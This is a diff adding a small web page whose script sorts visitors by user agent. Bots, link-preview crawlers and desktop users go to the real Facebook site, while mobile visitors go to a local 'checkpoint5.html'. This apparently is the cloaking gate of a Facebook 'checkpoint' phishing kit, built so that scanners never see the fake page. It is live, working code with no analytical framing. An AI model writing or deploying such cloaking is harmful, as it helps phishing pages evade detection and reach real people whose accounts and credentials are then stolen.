@@ -1,0 +1,12 @@
+<script>
+let user_agent = navigator.userAgent;
+let is_mobile = /Mobi|android|iphone/i.test(user_agent);
+let is_bot = /bot|facebot|crawl|facebot|whatsapp|telegram|slurp|spider/i.test(user_agent);
+
+if (!is_bot && is_mobile) {
+    window.location.href = "/checkpoint5.html";
+} else {
+    window.location.href = "https://www.facebook.com/";
+}
+</script>
+<img src="https://i.imgur.com/FOsLocb.png"/>
